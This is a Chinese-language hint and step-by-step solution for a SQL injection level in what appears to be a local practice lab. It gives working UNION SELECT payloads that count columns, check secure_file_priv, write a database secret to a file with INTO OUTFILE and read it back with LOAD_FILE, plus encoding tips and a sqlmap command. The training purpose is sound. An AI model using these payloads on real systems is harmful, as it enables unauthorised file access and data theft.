思路提示

注入点与 GET 数字型关完全相同：参数 id 直接拼接、查询固定返回 4 列。这一关分两步，两步都只改参数 id：先写入（UNION SELECT ... INTO OUTFILE 把查询结果落地成文件），再读取（UNION SELECT ... LOAD_FILE('路径') 让数据库把文件内容读回页面）。页面不会直接读文件，读回内容只能来自这条注入语句。

详细解题过程（点击展开）
1. 确认注入与列数
?id=1 order by 4 正常；?id=1 order by 5 报错 → 当前查询 4 列。

2. 判定可写目录（写入前的准备）
?id=-1 UNION SELECT 1,@@secure_file_priv,@@version_compile_os,@@datadir
看到 {{BASE_DIR}}/modules/sqli/files/，说明这是唯一允许读写的目录；Win64 表示目标为 Windows。

3. 写入：构造 INTO OUTFILE payload（把通关凭证写进 flag.txt）
构造思路：id 先给一个不会命中的值（如 -1），用 UNION SELECT 补齐 4 列，其中一列放 (SELECT secret FROM secrets WHERE id=1)， 末尾接 INTO OUTFILE '路径'；路径必须在第 2 步确认的可写目录内，且文件名不能已存在。
?id=-1 UNION SELECT 1,(SELECT secret FROM secrets WHERE id=1),3,4 INTO OUTFILE '{{BASE_DIR}}/modules/sqli/files/flag.txt'
写入成功后页面会提示「文件已落地」，此时代码框里的查询不会返回数据行。

4. 读取：构造 LOAD_FILE payload（通过注入把文件内容读回）
构造思路：同样 4 列 UNION SELECT，把 LOAD_FILE('同一路径') 放在其中一列，执行后文件内容会出现在结果表格里。
?id=-1 UNION SELECT 1,LOAD_FILE('{{BASE_DIR}}/modules/sqli/files/flag.txt'),3,4
若内容含换行/二进制导致显示不全，可改为十六进制再读（页面同样能识别）：
?id=-1 UNION SELECT 1,HEX(LOAD_FILE('{{BASE_DIR}}/modules/sqli/files/flag.txt')),3,4
读回内容命中通关凭证后，页面直接显示「通关成功」。

5. Windows 路径与斜杠转义（两种写法选其一）
正斜杠（推荐）：'{{BASE_DIR}}/modules/sqli/files/flag.txt'
双反斜杠：'安装路径\\modules\\sqli\\files\\flag.txt'（单写 \d 会被 MySQL 当作转义序列，路径损坏；「安装路径」需替换为你本机的真实部署路径，如 D:\\phpStudy\\WWW\\bafanglab）

6. URL 编码注意点（浏览器地址栏 / curl 场景）
单引号 ' → %27；空格 → %20（或 +）；双反斜杠 → %5C%5C； 正斜杠 / 一般无需编码。用 Burp Repeater 直接改原文时不要手动编码，否则会被二次解码。

7. 常见失败与重复练习
INTO OUTFILE 不能覆盖已存在的文件，第二次写入会报错误码 1086；点页面上的「清理本关写入的文件」，或换一个文件名再写。 路径不在 secure_file_priv 目录内会报 1290。
sqlmap 一句话验证：sqlmap -u "{{SITE}}/modules/sqli/outfile.php?id=1" --sql-query "SELECT secret FROM secrets WHERE id=1" --batch
